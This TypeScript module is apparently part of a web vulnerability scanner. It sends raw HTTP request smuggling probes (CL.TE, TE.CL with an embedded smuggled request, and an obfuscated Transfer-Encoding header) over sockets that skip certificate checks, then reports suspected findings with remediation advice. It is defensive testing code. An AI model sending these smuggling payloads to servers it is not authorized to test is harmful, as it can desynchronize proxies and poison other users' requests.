import * as net from 'node:net';
import * as tls from 'node:tls';
import { ts } from '../context';
import type { RealFinding, Target, LogFn } from '../context';

async function rawHttpRequest(
  hostname: string,
  port: number,
  isHttps: boolean,
  raw: string,
  timeoutMs = 8_000,
): Promise<string> {
  return new Promise((resolve) => {
    let response = '';
    const socket = isHttps
      ? tls.connect({ host: hostname, port, servername: hostname, rejectUnauthorized: false })
      : net.connect({ host: hostname, port });
    const timer = setTimeout(() => { socket.destroy(); resolve(response); }, timeoutMs);
    socket.on('connect', () => socket.write(raw));
    socket.on('data', (chunk) => { response += chunk.toString(); });
    socket.on('close', () => { clearTimeout(timer); resolve(response); });
    socket.on('error', () => { clearTimeout(timer); resolve(response); });
  });
}

export async function checkHttpRequestSmuggling(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing HTTP request smuggling (CL.TE and TE.CL)...`);

  // CL.TE: Send conflicting Content-Length and Transfer-Encoding
  const clTeRequest = [
    `POST / HTTP/1.1\r\n`,
    `Host: ${target.hostname}\r\n`,
    `Content-Length: 6\r\n`,
    `Transfer-Encoding: chunked\r\n`,
    `Connection: keep-alive\r\n`,
    `\r\n`,
    `0\r\n`,
    `\r\n`,
    `G`,
  ].join('');

  // TE.CL: Transfer-Encoding: chunked with Content-Length
  const teClRequest = [
    `POST / HTTP/1.1\r\n`,
    `Host: ${target.hostname}\r\n`,
    `Content-Length: 4\r\n`,
    `Transfer-Encoding: chunked\r\n`,
    `Connection: keep-alive\r\n`,
    `\r\n`,
    `5c\r\n`,
    `GPOST / HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n`,
    `0\r\n`,
    `\r\n`,
  ].join('');

  const smugglingTests = [
    { name: 'CL.TE', req: clTeRequest },
    { name: 'TE.CL', req: teClRequest },
  ];

  for (const { name, req } of smugglingTests) {
    try {
      const response = await rawHttpRequest(target.hostname, target.port, target.isHttps, req);
      if (!response) continue;
      const lines = response.split('\r\n');
      const statusLine = lines[0] ?? '';
      const statusCode = parseInt(statusLine.split(' ')[1] ?? '0');
      // Timeout with data = server confused about request boundary
      if (statusCode === 400 || statusCode === 505) {
        findings.push({
          title: `HTTP Request Smuggling Signal (${name})`,
          severity: 'medium',
          verification: 'suspected',
          confidence: 55,
          cvss: 7.5,
          cve: null,
          description: `The server returned HTTP ${statusCode} to a ${name} smuggling probe.`,
          evidence: `${name} raw request → HTTP ${statusCode}\nResponse: ${response.slice(0, 200)}`,
          remediation: 'Ensure only one reverse proxy processes requests and normalises CL/TE headers.',
        });
        await onLog(`[${ts()}] ⚠ HTTP SMUGGLING SIGNAL (${name}): HTTP ${statusCode}`);
      } else if (statusCode === 200) {
        // If second request poisoned, it might appear as second response
        const bodyCount = (response.match(/HTTP\/1\.[01]\s+\d{3}/g) ?? []).length;
        if (bodyCount > 1) {
          findings.push({
            title: `HTTP Request Smuggling Signal (${name}) — Multiple Responses`,
            severity: 'high',
            verification: 'suspected',
            confidence: 65,
            cvss: 8.1,
            cve: null,
            description: `Multiple HTTP response headers detected for a single ${name} probe.`,
            evidence: `${name} probe → ${bodyCount} HTTP responses\nRaw: ${response.slice(0, 400)}`,
            remediation: 'Normalise request headers at the load balancer.',
          });
          await onLog(`[${ts()}] ⚠ HTTP SMUGGLING: Multiple responses for ${name}`);
        }
      }
    } catch {}
  }

  // TE header obfuscation
  try {
    const obfRequest = [
      `POST / HTTP/1.1\r\n`,
      `Host: ${target.hostname}\r\n`,
      `Content-Length: 6\r\n`,
      `Transfer-Encoding: xchunked\r\n`,
      `\r\n`,
      `0\r\n`,
      `\r\n`,
    ].join('');
    const obfResp = await rawHttpRequest(target.hostname, target.port, target.isHttps, obfRequest, 5_000);
    if (obfResp.match(/HTTP\/1\.[01]\s+200/)) {
      findings.push({
        title: 'HTTP Request Smuggling — Transfer-Encoding Obfuscation Accepted',
        severity: 'medium',
        verification: 'suspected',
        confidence: 55,
        cvss: 6.1,
        cve: null,
        description: 'Server accepted a non-standard Transfer-Encoding: xchunked header.',
        evidence: `Transfer-Encoding: xchunked → HTTP 200`,
        remediation: 'Reject malformed Transfer-Encoding headers.',
      });
    }
  } catch {}

  if (findings.length === 0) await onLog(`[${ts()}] No HTTP smuggling signals detected`);
  return findings;
}
